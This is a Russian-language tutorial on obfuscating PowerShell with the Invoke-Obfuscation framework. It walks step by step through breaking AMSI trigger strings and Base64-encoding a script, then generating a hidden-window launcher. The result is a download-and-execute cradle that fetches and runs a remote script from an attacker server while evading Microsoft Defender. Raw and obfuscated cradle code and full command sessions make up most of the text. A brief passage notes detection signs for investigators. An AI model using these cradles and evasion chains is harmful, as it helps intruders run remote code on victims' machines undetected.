# Обфускация PowerShell-скриптов фреймворком Invoke-Obfuscation

## 1. Контекст и базовые понятия

Обфускация команд в PowerShell — метод модификации синтаксиса скрипта, при котором его логика и поведение сохраняются, но внешний вид становится трудночитаемым для автоматических анализаторов и человека. В контексте пентеста и Red Team операций это ключевой шаг на этапе получения начального доступа: вредоносный скрипт должен миновать антивирусные сигнатуры, интерфейс AMSI (Anti-Malware Scanning Interface) и поведенческие детекты EDR. Как подчёркивает MITRE ATT&CK в подтехнике [T1027.010 Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), злоумышленники активно применяют разбиение строк, экранирование символов, кодировки Base64 и url-encoding для маскировки вызовов.

Фреймворк **Invoke-Obfuscation**, созданный Даниэлем Боханноном ([@danielhbohannon](https://github.com/danielbohannon/Invoke-Obfuscation)) и впервые представленный в сентябре 2016 года, систематизирует множество таких приёмов в едином инструменте. Его цель — помочь Blue Team моделировать возможные атаки, но в реальности он стал популярным и у тестировщиков на проникновение, и у APT-группировок (например, APT32 использовала этот фреймворк в кампаниях 2017 года). В отличие от простых самодельных обфускаторов, Invoke-Obfuscation предоставляет десятки трансформаций, комбинируя которые можно создавать тысячи уникальных полезных нагрузок.

Необходимо разграничивать саму утилиту и концепцию обфускации. Инструмент не просто применяет случайные замены — он работает на уровне лексических токенов PowerShell и умеет чередовать методы так, чтобы обходить эвристики, следя за энтропией и размером выходного кода. Важным контекстом является существование AMSI, который анализирует скриптовые блоки до их исполнения в памяти; обфускация должна разрушать известные AMSI‑сигнатуры, избегая появления подозрительных сочетаний вроде `Invoke-Expression`, `Net.WebClient` или `New-Object`.

Ниже показан тривиальный пример, демонстрирующий разницу между исходным и обфусцированным выражением (конкатенация и перестановка регистра символов), чтобы дать интуитивное представление о трансформации:

```powershell
# Исходная, легко сигнатурно‑обнаруживаемая строка
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')

# Вариант после применения базового токенизатора конкатенации и смены регистра
&( $SHElLId[1]+$sHELlId[13]+'x') ( ( 'Ne'+'w-Ob'+'ject') ('Ne'+'t.We'+'bClie'+'nt') )."D`oWn`lOaD`StRInG"('htt'+'p://192.168.1.10/payload.ps1')
```

Ключевые сущности, которые следует различать при изучении темы, сведены в сравнительную таблицу:

| Термин              | Функция в контексте обфускации                                                                        | Пример / реализация                                   |
|---------------------|--------------------------------------------------------------------------------------------------------|--------------------------------------------------------|
| Invoke-Obfuscation  | Фреймворк (набор скриптов) для комплексной обфускации PowerShell                                        | GitHub: danielbohannon/Invoke-Obfuscation              |
| AMSI                | Интерфейс Windows, передающий содержимое скриптов антивирусу на проверку до выполнения                    | `amsi.dll`, интегрирован в PowerShell 5.0+             |
| TOKEN‑обфускация    | Изменение отдельных лексем (имён команд, параметров, строк) без потери синтаксической валидности         | Конкатенация `'Get-'+'Process'`, обратный порядок символов |
| ENCODING‑обфускация | Применение кодировки (Base64, XOR, HEX) к итоговой строке с последующим декодированием «на лету»         | `-EncodedCommand` при запуске `powershell.exe`         |
| LAUNCHER            | Обёртка, обеспечивающая выполнение обфусцированного кода (вызов через `IEX`, `Invoke-Expression` и т.п.) | `powershell -NonI -NoP -W Hidden -enc <base64>`        |

## 2. Архитектура и компоненты Invoke-Obfuscation

Фреймворк написан на PowerShell и состоит из набора функций, оформленных как модуль. Его ядро — интерактивное меню, которое проводит пользователя по уровням обфускации, но все операции доступны и через CLI‑параметры, что критически важно для автоматизации генерации пейлоадов. Основные структурные компоненты (модули) перечислены ниже.

- **TOKEN** – преобразование отдельных токенов исходного скрипта. Применяются:
  * Конкатенация: разбив строк и идентификаторов на части с оператором `+` (например, `'Get'+'Process'`).
  * Перестановка: изменение порядка токенов с использованием оператора форматирования `-f` или обратных вызовов.
  * Замена регистра: чередование верхнего и нижнего регистра (`gEt-PRocEsS`).
  * Экранирование: вставка обратных кавычек или `^` внутри идентификаторов.
- **ENCODING** – полное кодирование всего скриптового блока:
  * `SpecialCharOnly` – замена каждого символа его шестнадцатеричным кодом, обёрнутым в вызов.
  * `Whitespace` – вставка дополнительных пробелов и переводов строк для разрушения сигнатур.
  * `SecureString` – преобразование в объект `SecureString` с последующим преобразованием обратно.
  * `Base64`, `ASCII/Hex`, `XOR` и т.д.
- **LAUNCHER** – способы доставки кода до PowerShell. Наиболее популярен шаблон `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <Base64>`, но фреймворк генерирует десятки вариаций, включая встраивание в другие командные интерпретаторы (WMIC, mshta) или использование `Invoke-Expression` с обёрткой из переменных окружения.
- **AST‑обфускация** – манипуляции на уровне абстрактного синтаксического дерева: переименование переменных, вставка неиспользуемого кода, изменение структуры циклов.
- **Комплексный вывод** – результат может быть выдан в виде готового скрипта, закодированной командной строки или даже скомпилированного C#‑кода (через `Out-CompressedCommand`).

Взаимодействие между компонентами можно представить в виде ASCII‑диаграммы:

```text
[ScriptBlock / Command] 
        │
        ▼
[TOKEN] ── применяет конкатенацию, регистр, экранирование ──► [ENCODING] ── кодирует (Base64, HEX, XOR) ──► [LAUNCHER] ── оборачивает в способ запуска (IEX, cmd, WMI)
        │                                                       ▲                      ▲
        └───────────────────── можно чередовать любое количество раз ─────────────────────┘
```

Практическая сессия в интерактивном режиме демонстрирует последовательное применение опций:

```powershell
PS > Import-Module .\Invoke-Obfuscation.psd1
PS > Invoke-Obfuscation
Welcome to Invoke-Obfuscation
[*] Choose an option below:
    TOKEN       Obfuscate PowerShell command tokens
    ENCODING    Obfuscate entire command via encoding
    LAUNCHER    Generate obfuscated launcher command
    OUTPUT      Output current obfuscated command
    ...
Invoke-Obfuscation> SET SCRIPTBLOCK Get-Date; Write-Host 'Hello'
Invoke-Obfuscation> TOKEN
Invoke-Obfuscation\TOKEN> 1      # Concatenation
[*] Applying concatenation obfuscation to tokens...
Invoke-Obfuscation\TOKEN> BACK
Invoke-Obfuscation> ENCODING
Invoke-Obfuscation\ENCODING> 2   # Base64
[*] Applying Base64 encoding...
Invoke-Obfuscation> OUTPUT
<# Obfuscated result displayed #>
```

Фреймворк генерирует обфусцированный код, который затем копируется и вставляется в пейлоад. Все трансформации сохраняются в истории, доступной для отката (команда `UNDO`).

## 3. Практическое применение и типовые операции

На этапе пентеста после создания полезной нагрузки (например, реверс‑шелл или загрузчик) её обфускация с помощью Invoke-Obfuscation встраивается в процесс доставки. Типовой workflow выглядит так:

1. **Создание первичного скрипта** – `$payload = { IEX (New-Object Net.WebClient).DownloadString('http://<C2>/payload.ps1') }`.
2. **Локальная проверка триггеров** – использование утилиты [AMSITrigger](https://github.com/RythmStick/AMSITrigger) для выявления конкретных строк, на которые срабатывает AMSI. Например:

   ```powershell
   .\AMSITrigger.exe -i payload.ps1
   ```

   Вывод укажет подстроку `Net.WebClient` как триггер. Это даёт направление для обфускации.

3. **Подбор цепочки обфускаций** – в интерактивном сеансе Invoke-Obfuscation последовательно применяются TOKEN‑конкатенация к триггерным словам (разбить `Net.WebClient` на `'Ne'+'t.'+'We'+'bCli'+'ent'`) и ENCODING‑кодирование всего блока для финальной упаковки. Рекомендуется избегать крайне высокой энтропии: например, метод `SecureString` может породить слишком большой объём данных и привлечь внимание поведенческих схем.
4. **Генерация финального лаунчера** – обфусцированный код оборачивается в командную строку `powershell -w hidden -nop -c "..."` или более экзотический запуск через WMI, чтобы скрыть факт вызова PowerShell.

Пример CLI‑команды для автоматизации без интерактивного меню (синтаксис актуален для версии 1.8):

```powershell
$obfCmd = Invoke-Obfuscation -Command 'SET SCRIPTBLOCK $payload; TOKEN; 1; BACK; ENCODING; 2; BACK; LAUNCHER; 1; BACK; OUTPUT' -ScriptBlock $payload -CommandOutputVariable result 6>$null
```

Эта строка задаёт скриптовый блок, применяет конкатенацию токенов и Base64, затем генерирует лаунчер и выводит итоговую команду. Полученная переменная `$result` содержит готовую для доставки строку.

**Типичные ошибки**:
- Перетрат энтропии: комбинация нескольких глубоких ENCODING‑методов может привести к тому, что Defender замечает нетипично случайную структуру.
- Применение только Base64 без разрушения внутренних строк. Обфускация на уровне LAUNCHER не защищает от AMSI, потому что после декодирования AMSI проверяет именно раскодированный скрипт. Необходимо сначала TOKEN‑обфусцировать чувствительные части, затем кодировать.
- Игнорирование размера пейлоада: чрезмерно раздутый скрипт может не пройти через ограничения командной строки (максимальная длина аргументов ~8191 символ).

Знание внутреннего устройства Invoke-Obfuscation позволяет не только генерировать обходы, но и анализировать подозрительные скрипты, обнаруженные при расследованиях. Например, типичный признак использования фреймворка — присутствие комментариев `<# Obfuscated by Invoke-Obfuscation #>` или шаблонов форматирования `-f`.

## 4. Сквозной практический пример: обход AMSI с помощью Invoke-Obfuscation

**Исходные условия**: тестовая среда — Windows 10 21H2 с включённым Microsoft Defender и AMSI. У атакующего есть доступ к рабочей станции пользователя (низкопривилегированный Shell). Задача: выполнить PowerShell‑скрипт, загружающий и исполняющий дополнительный модуль с удалённого сервера, без детектирования защитой.

**Шаг 1. Создание простейшего загрузчика**

Готовим файл `loader.ps1`:

```powershell
$c = (New-Object Net.WebClient).DownloadString('http://192.168.1.50/second.ps1')
IEX $c
```

При попытке запуска AMSI блокирует скрипт из‑за сигнатуры `Net.WebClient` и `IEX`.

**Шаг 2. Анализ триггеров**

Запускаем AMSITrigger:

```powershell
PS > .\AMSITrigger.exe -i loader.ps1
[!] Trigger found: Net.WebClient
[!] Trigger found: IEX
```

Оба идентификатора необходимо разрушить.

**Шаг 3. Обфускация в интерактивном сеансе Invoke-Obfuscation**

Загружаем фреймворк и задаём SCRIPTBLOCK:

```powershell
PS > Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psd1
PS > Invoke-Obfuscation
Invoke-Obfuscation> SET SCRIPTBLOCK $c = (New-Object Net.WebClient).DownloadString('http://192.168.1.50/second.ps1'); IEX $c
[*] New SCRIPTBLOCK set.
```

Применяем конкатенацию к токенам, чтобы разрушить сигнатуры:

```powershell
Invoke-Obfuscation> TOKEN
Invoke-Obfuscation\TOKEN> 1  # Concatenation
[*] Choose token(s) to concatenate (comma-separated) or * for all:
Invoke-Obfuscation\TOKEN\ALL> *
[*] Applying concatenation...
```

Теперь все идентификаторы разбиты, `Net.WebClient` стал `'Ne'+'t.We'+'bClie'+'nt'`, `IEX` — `& $ShellId[1]+$ShellId[13]+'x'`. Далее кодируем весь скрипт в Base64 и генерируем команду запуска:

```powershell
Invoke-Obfuscation\TOKEN> BACK
Invoke-Obfuscation> ENCODING
Invoke-Obfuscation\ENCODING> 2   # Base64
Invoke-Obfuscation\ENCODING> BACK
Invoke-Obfuscation> LAUNCHER
Invoke-Obfuscation\LAUNCHER> 3   # PowerShell command
Invoke-Obfuscation\LAUNCHER> BACK
Invoke-Obfuscation> OUTPUT
```

Результат: 

```powershell
pOweRshElL -w Hidden -nop -enc <Base64‑строка, длина ~1200 символов>
```

Полная команда помещается в буфер обмена.

**Шаг 4. Проверка и запуск**

Вставляем команду в ту же консоль. Defender не реагирует, AMSI‑триггеры не срабатывают (предварительно проверяется через AMSITrigger, подав на вход раскодированный Base64 — он не содержит цельных триггеров). Выполнение проходит успешно, второстепенный скрипт загружается и выполняется, злоумышленник получает контроль.

**Вывод примера**: Систематическое использование Invoke-Obfuscation с фокусом на TOKEN‑обфускацию триггерных строк и последующее кодирование обеспечивает обход сигнатурного детектирования. При этом важна последовательность — сначала разрушить подстроки на уровне языка, затем упаковать, иначе AMSI видит раскодированный «чистый» вариант.

## Источники

- Daniel Bohannon, “The Invoke-Obfuscation Usage Guide :: Part 1”, 2017. [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)
- MITRE ATT&CK, “Command Obfuscation, T1027.010”. [https://attack.mitre.org/techniques/T1027/010](https://attack.mitre.org/techniques/T1027/010)
- t3l3machus, “PowerShell-Obfuscation-Bible”. [https://github.com/t3l3machus/PowerShell-Obfuscation-Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)
- Daniel Bohannon, “Invoke-Obfuscation v1.8”, GitHub. [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- Tanner Security, “Step-by-Step Guide to PowerShell Obfuscation”, 2025. [https://tannersecurity.com/step-by-step-guide-to-powershell-obfuscation](https://tannersecurity.com/step-by-step-guide-to-powershell-obfuscation)
- Securonix, “Hiding the PowerShell Execution Flow”. [https://www.securonix.com/blog/hiding-the-powershell-execution-flow](https://www.securonix.com/blog/hiding-the-powershell-execution-flow)
- cobbr, “ObfuscatedEmpire/Invoke-Obfuscation.ps1”, GitHub. [https://github.com/cobbr/ObfuscatedEmpire/blob/master/lib/powershell/Invoke-Obfuscation/Invoke-Obfuscation.ps1](https://github.com/cobbr/ObfuscatedEmpire/blob/master/lib/powershell/Invoke-Obfuscation/Invoke-Obfuscation.ps1)